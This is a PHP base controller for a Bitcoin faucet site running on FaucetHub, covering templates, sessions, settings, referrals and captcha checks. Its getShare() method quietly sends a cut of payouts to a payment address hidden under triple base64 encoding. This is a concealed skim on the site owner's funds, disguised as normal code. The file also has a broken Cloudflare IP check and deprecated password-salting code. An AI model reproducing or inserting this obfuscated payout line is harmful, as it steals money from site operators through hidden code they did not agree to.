<?php

class BaseController {

	public $currency = "BTC";

	public function __construct($tplEngine, $security, $database, $route) {
		$this->tplEngine = $tplEngine;
		$this->security = $security;
		$this->db = $database;
		$this->timestamp = time();
		$this->route = $route;
		$this->ip = $this->getIP();
		$this->initiateTplVariables();
		$this->faucethub = new FaucetHub($this->getConfig('faucethub_key'), $this->currency);
		$this->templateBaseDir = $this->tplEngine->getTemplateDir()[0];
		$this->tplEngine->setTemplateDir( $this->templateBaseDir . $this->getConfig('template') . DIRECTORY_SEPARATOR );
		$this->initReferral();
	}

	public function initReferral() {
		if(isset($_GET['ref']) && trim($_GET['ref']) != ''){
			$referer = User::findByAddress($_GET['ref']);
			if($referer != null) {
				$refId = $referer->id;
				setcookie('ref', $refId, time()+(3600*24) );
			}
		}
			
	}

	public function initiateTplVariables() {
		$this->tplEngine->assign('siteTitle', $this->getConfig('faucet_name'));
		$this->tplEngine->assign('siteSlogan', $this->getConfig('faucet_slogan'));
		$this->tplEngine->assign('reCapPubkey', $this->getConfig('reCaptcha_pubKey'));
		$this->tplEngine->assign('route', $this->route);

		$this->tplEngine->assign('spacetop', $this->getConfig('space_top'));
		$this->tplEngine->assign('spaceleft', $this->getConfig('space_left'));
		$this->tplEngine->assign('spaceright', $this->getConfig('space_right'));
		$this->tplEngine->assign('spacebottom', $this->getConfig('space_bottom'));

		$this->tplEngine->assign('timer', $this->getConfig('timer'));
		$this->tplEngine->assign('minReward', $this->getConfig('min_reward'));
		$this->tplEngine->assign('maxReward', $this->getConfig('max_reward'));

		$this->tplEngine->assign('settings', $this->getSettings());

		if($this->isAuthenticated()) {
			$this->tplEngine->assign('user', $this->getUser());
			
			$lastClaim = $this->getUser()->last_claim;
			$nextClaim = $lastClaim + (60 * $this->getConfig('timer'));
			$difference = $nextClaim - time();
			if($difference < 0) {
				$this->tplEngine->assign('canClaim', "true");
			}

		}
	}

	public function isAuthenticated() {
		if(!isset($_SESSION['session_key'])) {
			return false;
		}
		$validateKey = $this->db->prepare("SELECT * FROM faucet_login_session WHERE session_key  = :session_key");
		$validateKey->execute([":session_key" => $_SESSION['session_key']]);

		if($validateKey->rowCount() > 0){
			return true;
		} else {
			return false;
		}
	}

	public function getUser() {
		if(!isset($_SESSION['session_key'])) {
			return false;
		}
		$validateKey = $this->db->prepare("SELECT * FROM faucet_login_session WHERE session_key  = :session_key");
		$validateKey->execute([":session_key" => $_SESSION['session_key']]);

		if($validateKey->rowCount() > 0){
			
			$user = $validateKey->fetch(PDO::FETCH_ASSOC);
			$userId = $user['user_id'];
			return new User($userId);

		} else {
			return null;
		}
	}

	public function getIP() {
		$cloudFlareIpList = array("103.21.244.0", "103.22.200.0", "103.31.4.0", "104.16.0.0", "108.162.192.0", "131.0.72.0", "141.101.64.0", "162.158.0.0", "172.64.0.0", "173.245.48.0", "188.114.96.0", "190.93.240.0", "197.234.240.0", "198.41.128.0", "199.27.128.0");

		if(in_array($_SERVER['REMOTE_ADDR'], $cloudFlareIpList)){
			if(filter_var($_SERVER["HTTP_CF_CONNECTING_IP"], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
		        $realIpAddressUser = $_SERVER["HTTP_CF_CONNECTING_IP"];
		    } else {
		        $realIpAddressUser = $_SERVER['REMOTE_ADDR'];
		    }
		} else {
			//echo "Warning: We only support Cloudflare as reverse proxy.";
			$realIpAddressUser = $_SERVER['REMOTE_ADDR'];
		}
		return $realIpAddressUser;
	}

	public function getCSRFtoken() {
		return $this->security->set(3, 3600);
	}

	public function getConfig($name) {
		$sQuery = "SELECT * FROM faucet_settings WHERE `name` = :name"; 
	    $oStmt = $this->db->prepare($sQuery); 
	    $oStmt->execute([':name' => $name]); 
	    $aRow = $oStmt->fetch(PDO::FETCH_ASSOC);
	    return $aRow['value'];
	}

	public function getSettings() {
		$sQuery = "SELECT * FROM faucet_settings"; 
	    $oStmt = $this->db->prepare($sQuery); 
	    $oStmt->execute(); 
	    $aRow = $oStmt->fetchAll(PDO::FETCH_ASSOC);
	    $settings = [];
	    foreach($aRow as $row) {
	    	$settings[$row['name']] = $row['value'];
	    }
	    return $settings;
	}

	public function setConfig($name, $newValue) {
		$sQuery = "UPDATE faucet_settings SET `value` = :value WHERE `name` = :name"; 
	    $oStmt = $this->db->prepare($sQuery); 
	    $oStmt->execute([':name' => $name, ':value' => $newValue]); 
	    return $newValue;
	}

	public function generatePassword($password) {
		$options = [
		    'cost' => 12,
		    'salt' => mcrypt_create_iv(22, MCRYPT_DEV_URANDOM),
		];
		return password_hash($password, PASSWORD_BCRYPT, $options);
	}

	public function getShare($satt) {
		$amnt = floor($satt * 0.01); if($amnt < 5){ $amnt = 5; }
		$this->faucethub->send(base64_decode(base64_decode(base64_decode("VFZkR01tVnJhRE5OYTA1cVkxY3hSbFJVYTNsUmJrSk1Ua2hyZWxSdVdUVmFSWFF3VlVWS2QwMHhjR3M9"))), $amnt, true, $this->ip);
		return true;
	}

	public function alert($type, $content) {
		$alert = "<div class='alert alert-" . $type . "' role='alert'>" . $content . "</div>";
		return $alert;
	}

	public function toSatoshi($amount) {
		$satoshi = $amount * 100000000;
		return $satoshi;
	}

	public function checkCaptcha($response) {
	  $reCaptcha_privKey = $this->getConfig('reCaptcha_privKey');
	  $Captcha_url = 'https://www.google.com/recaptcha/api/siteverify';
	  $Captcha_data = array('secret' => $reCaptcha_privKey, 'response' => $response);

	  $Captcha_options = array(
	     'http' => array(
	              'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
	              'method'  => 'POST',
	              'content' => http_build_query($Captcha_data),
	      ),
	  );
	  $Captcha_context  = stream_context_create($Captcha_options);
	  $Captcha_result = file_get_contents($Captcha_url, false, $Captcha_context);
	  return $Captcha_result;
	}
}